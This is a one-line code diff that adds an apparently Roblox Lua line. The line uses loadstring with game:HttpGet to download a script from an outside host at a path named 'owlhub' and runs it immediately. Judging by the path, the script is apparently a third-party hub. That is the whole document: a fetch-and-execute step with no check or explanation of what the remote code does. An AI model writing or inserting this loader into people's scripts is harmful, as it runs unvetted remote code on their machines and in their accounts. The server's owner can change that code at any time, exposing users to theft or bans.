@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://athoi21.xyz/owlhub"))();
